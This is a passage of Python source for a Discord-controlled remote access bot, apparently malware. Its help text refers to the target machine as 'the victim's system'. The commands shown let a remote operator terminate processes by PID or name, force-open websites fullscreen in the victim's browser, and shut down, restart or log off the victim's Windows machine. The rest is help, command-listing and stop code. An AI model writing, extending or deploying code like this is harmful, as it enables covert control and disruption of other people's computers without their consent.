async def kill(ctx, arg: str = ""):
    if arg == "" or not arg:
        await ctx.send("Please enter a task to be terminated")
    try:
        pid = int(arg)
        process = psutil.Process(pid)
        process.terminate() 
        await ctx.send(f"Task with PID {pid} has been terminated!")
    except ValueError:
        terminated = 0
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == arg:
                try:
                    psutil.Process(proc.info['pid']).terminate()
                    terminated += 1
                except psutil.NoSuchProcess:
                    pass
        if terminated > 0:
            await ctx.send(f"Terminated {terminated} processes with the name {arg}.")
        else:
            await ctx.send(f"No processes with the name {arg} found.")
    except Exception as e:
        await ctx.send(f"Error terminating task: {str(e)}")

@bot.command(help="Opens the given website on the victim's default browser and maximizes it.")
async def website(ctx, *, url: str):
    try:
        webbrowser.open(url)
        time.sleep(3)
        pyautogui.hotkey('f11')
        
        await ctx.send(f"Opened and maximized the website: {url}")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Shuts down the victim's system.")
async def shutdown(ctx):
    try:
        os.system('shutdown /s /t 1')
        await ctx.send("Command Executed! System is shutting down.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Restarts the victim's system.")
async def restart(ctx):
    try:
        os.system('shutdown /r /t 1')
        await ctx.send("Command Executed! System is restarting.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command(help="Logs off the current user on the victim's system.")
async def logoff(ctx):
    try:
        os.system('shutdown /l')
        await ctx.send("Command Executed! Logging off.")
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")

@bot.command()
async def help(ctx, command_name: str):
    command = bot.get_command(command_name)
    if command:
        embed = discord.Embed(
            title=f"Help: {command_name}",
            description=command.help if command.help else "No description provided",
            color=0x007BFF
        )
        await ctx.send(embed=embed)
    else:
        await ctx.send(f"Command '{command_name}' not found.")

per_page = 10

@bot.command()
async def commands(ctx, page: int = 1):
    commands_list = list(bot.commands)
    commands_list.sort(key=lambda cmd: cmd.name)

    max_page = (len(commands_list) - 1) // per_page + 1

    if page < 1 or page > max_page:
        await ctx.send(f"Page {page} is out of range. Please provide a page number between 1 and {max_page}.")
        return

    start_index = (page - 1) * per_page
    end_index = start_index + per_page
    commands_on_page = commands_list[start_index:end_index]

    embed = discord.Embed(
        title="Available Commands",
        description="List of all commands",
        color=0x007BFF
    )

    for command in commands_on_page:
        embed.add_field(
            name=command.name,
            value=command.help if command.help else "No description provided",
            inline=False
        )

    embed.set_footer(text=f"Page {page}/{max_page}")

    message = await ctx.send(embed=embed)

    if max_page > 1:
        await message.add_reaction("◀️")
        await message.add_reaction("▶️")

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ["◀️", "▶️"] and reaction.message.id == message.id

    while True:
        try:
            reaction, user = await bot.wait_for("reaction_add", check=check)
            await message.remove_reaction(reaction, user)
            
            if str(reaction.emoji) == "◀️" and page > 1:
                page -= 1
            elif str(reaction.emoji) == "▶️" and page < max_page:
                page += 1
            
            start_index = (page - 1) * per_page
            end_index = start_index + per_page
            commands_on_page = commands_list[start_index:end_index]

            embed.clear_fields()
            for command in commands_on_page:
                embed.add_field(
                    name=command.name,
                    value=command.help if command.help else "No description provided",
                    inline=False
                )
            
            embed.set_footer(text=f"Page {page}/{max_page}")

            await message.edit(embed=embed)

        except asyncio.TimeoutError:
            break
        
@bot.command(help="Force stops the bot.")
async def estop(ctx):
    await ctx.send("Force stopping bot...")
    await bot.close()
    os._exit(0)

try:
    bot.run(TOKEN)
except discord.errors.LoginFailure:
    exit("\n\033[91mError: Invalid bot token.\033[0m")